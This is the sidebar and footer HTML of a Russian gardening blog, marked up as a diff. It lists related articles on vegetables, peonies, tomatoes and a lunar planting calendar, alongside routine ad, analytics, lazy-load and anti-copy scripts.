+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div>
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/ogorod/vyrashhivaniya-ovoshhejj-v-kontejjnerakh/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2015/07/002.jpg.webp 640w, https://greenhome.blog/wp-content/uploads/2015/07/002-300x225.jpg.webp 300w"><img width="80" height="60" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAoAAAAHgAQMAAAAPH06nAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAADxJREFUGBntwQENAAAAwiD7p34ON2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcCiX4AABZcukJwAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="Выращивание овощей в контейнерах фото" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2015/07/002.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2015/07/002.jpg 640w, https://greenhome.blog/wp-content/uploads/2015/07/002-300x225.jpg 300w" data-sizes="auto" /><noscript><img width="80" height="60" src="https://greenhome.blog/wp-content/uploads/2015/07/002.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="Выращивание овощей в контейнерах фото" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2015/07/002.jpg 640w, https://greenhome.blog/wp-content/uploads/2015/07/002-300x225.jpg 300w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/ogorod/vyrashhivaniya-ovoshhejj-v-kontejjnerakh/">Особенности выращивания овощей в контейнерах</a></div>
+
+        
+                    <div class="widget-article__description">
+                При выращивании овощей в контейнерах можно получить качественный урожай, но следует помнить, что вырастить            </div>
+        
+                    <div class="entry-meta">
+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div>
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/sad/uhod-za-pionami-v-mae-podkormka-obrabotka-chto-nuzhno-delat/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1.jpg.webp 770w, https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1-300x129.jpg.webp 300w, https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1-330x140.jpg.webp 330w"><img width="80" height="34" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAwIAAAFKAQMAAACU5nrTAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAADZJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3AR+VAABNzxJ/QAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="Фото пионов_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1.jpg 770w, https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1-330x140.jpg 330w" data-sizes="auto" /><noscript><img width="80" height="34" src="https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="Фото пионов_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1.jpg 770w, https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2022/04/Piony_glavnaya-1-330x140.jpg 330w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/sad/uhod-za-pionami-v-mae-podkormka-obrabotka-chto-nuzhno-delat/">Как ухаживать за пионами в мае, что делать для пышного цветения</a></div>
+
+        
+                    <div class="widget-article__description">
+                От подкормки и обработки пионов в мае зависит качество цветения и здоровье растения. В            </div>
+        
+                    <div class="entry-meta">
+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div>
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/ogorod/adskaya-smes-protiv-boleznej-i-vreditelej-v-sadu-i-ogorode-retsept/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya.jpg.webp 770w, https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya-300x129.jpg.webp 300w, https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya-330x140.jpg.webp 330w"><img width="80" height="34" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAwIAAAFKAQMAAACU5nrTAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAADZJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3AR+VAABNzxJ/QAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="Фото адской смеси_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya.jpg 770w, https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya-330x140.jpg 330w" data-sizes="auto" /><noscript><img width="80" height="34" src="https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="Фото адской смеси_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya.jpg 770w, https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2022/01/Adskaya-smes_osnovnaya-330x140.jpg 330w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/ogorod/adskaya-smes-protiv-boleznej-i-vreditelej-v-sadu-i-ogorode-retsept/">Как сделать &#171;адскую смесь&#187; для обработки растений от болезней и вредителей</a></div>
+
+        
+                    <div class="widget-article__description">
+                От нашествия вредителей и распространения болезней в саду или огороде надо использовать мощную адскую            </div>
+        
+                    <div class="entry-meta">
+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div>
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/ogorod/lunnyj-kalendar-sadovoda-i-ogorodnika-na-fevral-2023-goda/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2023/02/Lunnye-fazy_glavnaya-80x80.jpg.webp 80w, https://greenhome.blog/wp-content/uploads/2023/02/Lunnye-fazy_glavnaya-150x150.jpg.webp 150w"><img width="80" height="80" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQAQAAAACmas8AAAAAAnRSTlMAAHaTzTgAAAARSURBVCjPY2AYBaNgFNALAAADcAABkVpjHQAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="Фото лунных фаз" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2023/02/Lunnye-fazy_glavnaya-80x80.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2023/02/Lunnye-fazy_glavnaya-80x80.jpg 80w, https://greenhome.blog/wp-content/uploads/2023/02/Lunnye-fazy_glavnaya-150x150.jpg 150w" data-sizes="auto" /><noscript><img width="80" height="80" src="https://greenhome.blog/wp-content/uploads/2023/02/Lunnye-fazy_glavnaya-80x80.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="Фото лунных фаз" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2023/02/Lunnye-fazy_glavnaya-80x80.jpg 80w, https://greenhome.blog/wp-content/uploads/2023/02/Lunnye-fazy_glavnaya-150x150.jpg 150w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/ogorod/lunnyj-kalendar-sadovoda-i-ogorodnika-na-fevral-2023-goda/">Посевной календарь садовода и огородника на февраль 2023 года, благоприятные лунные дни для посадок</a></div>
+
+        
+                    <div class="widget-article__description">
+                Февраль – первый полноценный месяц выращивания рассады. В это время высаживают тепличные сорта перцев,            </div>
+        
+                    <div class="entry-meta">
+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div>
+<div class="widget-article widget-article--compact">
+            <div class="widget-article__image">
+            <a href="https://greenhome.blog/ogorod/chtoby-pomidory-byli-krupnymi-chem-podkormit/">
+                <picture><source  sizes='(max-width: 80px) 100vw, 80px' type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2.jpg.webp 770w, https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2-300x129.jpg.webp 300w, https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2-768x329.jpg.webp 768w, https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2-330x140.jpg.webp 330w"><img width="80" height="34" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAwIAAAFKAQMAAACU5nrTAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAADZJREFUGBntwTEBAAAAwiD7p14KP2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3AR+VAABNzxJ/QAAAABJRU5ErkJggg==" class="attachment-thumb-square size-thumb-square wp-post-image lazyload" alt="Фото помидоров_главная" decoding="async"   data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2.jpg" data-srcset="https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2.jpg 770w, https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2-330x140.jpg 330w" data-sizes="auto" /><noscript><img width="80" height="34" src="https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2.jpg" class="attachment-thumb-square size-thumb-square wp-post-image" alt="Фото помидоров_главная" decoding="async" srcset="https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2.jpg 770w, https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2-300x129.jpg 300w, https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2-768x329.jpg 768w, https://greenhome.blog/wp-content/uploads/2021/07/Pomidory_glavnaya-2-330x140.jpg 330w" sizes="(max-width: 80px) 100vw, 80px" data-eio="l" /></noscript></picture>            </a>
+        </div>
+    
+    <div class="widget-article__body">
+        <div class="widget-article__title"><a href="https://greenhome.blog/ogorod/chtoby-pomidory-byli-krupnymi-chem-podkormit/">Подкормка томатов, чтобы были крупными, чем удобрять</a></div>
+
+        
+                    <div class="widget-article__description">
+                Если вы хотите получить урожай спелых крупных помидоров, их надо правильно подкормить. От внесенных            </div>
+        
+                    <div class="entry-meta">
+                                    <span class="entry-meta__comments" title="Комментарии"><span class="fa fa-comment-o"></span> 0</span>
+                                            </div>
+            </div>
+</div></div></div><div id="custom_html-2" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><!-- Yandex.RTB R-A-989709-3 -->
+<div id="yandex_rtb_R-A-989709-3"></div>
+<script type="text/javascript">
+    (function(w, d, n, s, t) {
+        w[n] = w[n] || [];
+        w[n].push(function() {
+            Ya.Context.AdvManager.render({
+                blockId: "R-A-989709-3",
+                renderTo: "yandex_rtb_R-A-989709-3",
+                async: true
+            });
+        });
+        t = d.getElementsByTagName("script")[0];
+        s = d.createElement("script");
+        s.type = "text/javascript";
+        s.src = "//an.yandex.ru/system/context.js";
+        s.async = true;
+        t.parentNode.insertBefore(s, t);
+    })(this, this.document, "yandexContextAsyncCallbacks");
+</script></div></div>
+    
+</aside><!-- #secondary -->
+
+
+	</div><!-- #content -->
+
+    
+    
+        <div class="footer-navigation container" itemscope itemtype="http://schema.org/SiteNavigationElement">
+        <div class="main-navigation-inner ">
+            <div class="menu-menyu-v-futere-container"><ul id="footer_menu" class="menu"><li id="menu-item-8816" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8816"><a href="https://greenhome.blog/o-nas/">О Нас</a></li>
+<li id="menu-item-8814" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8814"><a href="https://greenhome.blog/kontakty/">Контакты</a></li>
+<li id="menu-item-8815" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-8815"><a rel="privacy-policy" href="https://greenhome.blog/politika-konfidentsialnosti-greenhome/">Политика конфиденциальности</a></li>
+<li id="menu-item-8819" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8819"><a href="https://greenhome.blog/karta-sajjta/">Карта сайта</a></li>
+</ul></div>        </div>
+    </div>
+
+
+
+    <footer id="site-footer" class="site-footer container " itemscope itemtype="http://schema.org/WPFooter">
+        <div class="site-footer-inner ">
+
+            
+            <div class="footer-bottom">
+                <div class="footer-info">
+                    © 2023 Все права защищены. Копирование материала запрещено!
+                    <div class="footer-text"><a href="https://greenhome.blog/politika-konfidentsialnosti-greenhome/">Политика конфиденциальности</a></div>
+                                    </div><!-- .site-info -->
+
+                
+<div class="social-links">
+    <div class="social-buttons social-buttons--square social-buttons--circle social-buttons--small">
+
+    <span class="social-button social-button__vk js-link" data-href="aHR0cHM6Ly92ay5jb20vZ3JlZW5ob21lYmxvZw==" data-target="_blank"></span><span class="social-button social-button__ok js-link" data-href="aHR0cHM6Ly9vay5ydS9ncm91cC81MzE5MjM5MjExNDMzNw==" data-target="_blank"></span><span class="social-button social-button__telegram js-link" data-href="aHR0cHM6Ly90Lm1lL2dyZWVuaG9tZWJsb2c=" data-target="_blank"></span><span class="social-button social-button__youtube js-link" data-href="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ0JQZEZYbVlKTXBLQnpwZDhMUm1SS0E=" data-target="_blank"></span>
+    </div>
+</div>
+
+
+                <div class="footer-counters"><!-- Yandex.Metrika counter --> <script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(27809682, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true }); </script> <noscript><div><img src="https://mc.yandex.ru/watch/27809682" style="position:absolute; left:-9999px;" alt="" /></div></noscript> <!-- /Yandex.Metrika counter --></div>            </div>
+        </div><!-- .site-footer-inner -->
+    </footer><!-- .site-footer -->
+
+
+            <button type="button" class="scrolltop js-scrolltop"></button>
+    
+
+</div><!-- #page -->
+
+
+<script>var pseudo_links = document.querySelectorAll(".pseudo-clearfy-link");for (var i=0;i<pseudo_links.length;i++ ) { pseudo_links[i].addEventListener("click", function(e){   window.open( e.target.getAttribute("data-uri") ); }); }</script><!-- Yandex.RTB R-A-989709-148 -->
+<div id="yandex_rtb_R-A-989709-148"></div>
+<script>window.yaContextCb.push(()=>{
+	Ya.Context.AdvManager.renderFeed({
+		"blockId": "R-A-989709-148",
+		"renderTo": "yandex_rtb_R-A-989709-148"
+	})
+})
+window.yaContextCb.push(()=>{
+  Ya.Context.AdvManager.render({
+    type: 'floorAd',    
+    blockId: 'R-A-989709-134'
+  })
+})
+  const feed = document.getElementById('yandex_rtb_R-A-989709-148');
+  const callback = (entries) => {
+    entries.forEach((entry) => {
+      if (entry.isIntersecting) {
+        Ya.Context.AdvManager.destroy({blockId: 'R-A-989709-134'});
+      }
+    });
+  };
+  const observer = new IntersectionObserver(callback, {
+    threshold: 0,
+  });
+  observer.observe(feed);
+</script>
+<script>function disableSelection(target){if (typeof target.onselectstart!="undefined") target.onselectstart=function(){return false};else if (typeof target.style.MozUserSelect!="undefined")target.style.MozUserSelect="none";else target.onmousedown=function(){return false};target.style.cursor = "default"}disableSelection(document.body);</script><script>document.oncontextmenu = function() { return false; }</script><script>document.addEventListener("copy", (event) => {var pagelink = "\nИсточник: https://greenhome.blog/wp-content/uploads/2022/01/Rassada-lobelii_glavnaya-1.jpg%20770w";event.clipboardData.setData("text", document.getSelection() + pagelink);event.preventDefault();});</script><script  id='eio-lazy-load-js-before'>
+var eio_lazy_vars = {"exactdn_domain":"","skip_autoscale":0,"threshold":0};
+</script>
+<script  src='https://greenhome.blog/wp-content/plugins/ewww-image-optimizer/includes/lazysizes.min.js' id='eio-lazy-load-js'></script>
+<script type='text/javascript' id='root-scripts-js-extra'>
+/* <![CDATA[ */
+var settings_array = {"rating_text_average":"\u0441\u0440\u0435\u0434\u043d\u0435\u0435","rating_text_from":"\u0438\u0437","lightbox_enabled":""};
+var wps_ajax = {"url":"https:\/\/greenhome.blog\/wp-admin\/admin-ajax.php","nonce":"9e26fcb6c5"};
+/* ]]> */
+</script>
+<script  src='https://greenhome.blog/wp-content/themes/root/assets/js/scripts.min.js' id='root-scripts-js'></script>
+<script type='text/javascript' id='q2w3_fixed_widget-js-extra'>
+/* <![CDATA[ */
+var q2w3_sidebar_options = [{"sidebar":"sidebar-1","use_sticky_position":false,"margin_top":0,"margin_bottom":0,"stop_elements_selectors":"","screen_max_width":0,"screen_max_height":0,"widgets":["#custom_html-2"]}];
+/* ]]> */
+</script>
+<script  src='https://greenhome.blog/wp-content/plugins/q2w3-fixed-widget/js/frontend.min.js' id='q2w3_fixed_widget-js'></script>
+<div id="clearfy-cookie" class="clearfy-cookie clearfy-cookie-hide clearfy-cookie--bottom">  <div class="clearfy-cookie-container">   Этот сайт использует cookie для хранения данных. Продолжая использовать сайт, Вы даете свое согласие на работу с этими файлами.   <button id="clearfy-cookie-accept" class="clearfy-cookie-accept">OK</button>  </div></div><script>var cookie_clearfy_hide = document.cookie.replace(/(?:(?:^|.*;\s*)clearfy_cookie_hide\s*\=\s*([^;]*).*$)|^.*$/, "$1");if ( ! cookie_clearfy_hide.length ) {  document.getElementById("clearfy-cookie").classList.remove("clearfy-cookie-hide");} document.getElementById("clearfy-cookie-accept").onclick = function() { document.getElementById("clearfy-cookie").className += " clearfy-cookie-hide"; var clearfy_cookie_date = new Date(new Date().getTime() + 31536000 * 1000); document.cookie = "clearfy_cookie_hide=yes; path=/; expires=" + clearfy_cookie_date.toUTCString(); setTimeout(function() { document.getElementById("clearfy-cookie").parentNode.removeChild( document.getElementById("clearfy-cookie") ); }, 300);}</script>
+
+</body>
+</html>
